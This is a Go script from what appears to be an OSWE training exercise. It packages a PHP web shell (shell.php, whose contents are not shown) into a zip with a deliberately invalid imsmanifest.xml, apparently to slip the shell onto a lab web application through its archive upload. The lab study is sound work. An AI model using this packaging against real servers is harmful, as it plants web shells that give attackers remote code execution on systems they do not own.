package main

import (
	"archive/zip"
	"io"
	"log"
	"os"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Ex 3.8.1.2 - Create POC zip archive (including PHP file)

func buildZip() {
	archive := utils.CreateZipFile("poc.zip")
	defer archive.Close()
	zipWriter := zip.NewWriter(archive)

	// poc.txt
	utils.CreateFile("poc.txt", "hello!\n")
	file1, err := os.Open("poc.txt")
	if err != nil {
		log.Fatalln("Error while opening poc.txt", err)
	}
	defer file1.Close()

	utils.PrintInfo("Writing poc.txt to zip archive...")
	writer1, err := zipWriter.Create("poc/poc.txt")
	if err != nil {
		log.Fatalln("Error while creating poc/poc.txt", err)
	}

	_, err = io.Copy(writer1, file1)
	if err != nil {
		log.Fatalln("Error while writing file to zip archive...", err)
	}

	// imsmanifest.xml
	//err = os.WriteFile("imsmanifest.xml", []byte("<validTag></validTag>\n"), 0644)
	utils.CreateFile("imsmanifest.xml", "invalid XML!")
	file2, err := os.Open("imsmanifest.xml")
	if err != nil {
		log.Fatalln("Error while opening imsmanifest.xml", err)
	}
	defer file2.Close()

	utils.PrintInfo("Writing imsmanifest.xml to zip archive...")
	writer2, err := zipWriter.Create("imsmanifest.xml")
	if err != nil {
		log.Fatalln("Error while creating imsmanifest.xml", err)
	}

	_, err = io.Copy(writer2, file2)
	if err != nil {
		log.Fatalln("Error while writing file to zip archive...", err)
	}

	// shell.php
	file3, err := os.Open("shell.php")
	if err != nil {
		log.Fatalln("Error while opening shell.php", err)
	}
	defer file3.Close()

	utils.PrintInfo("Writing shell.php to zip archive...")
	writer3, err := zipWriter.Create("poc/shell.php")
	if err != nil {
		log.Fatalln("Error while creating shell.php", err)
	}

	_, err = io.Copy(writer3, file3)
	if err != nil {
		log.Fatalln("Error while writing file to zip archive...", err)
	}

	utils.PrintSuccess("Finished writing and closing zip archive!")
	zipWriter.Close()
}

func main() {
	buildZip()
}
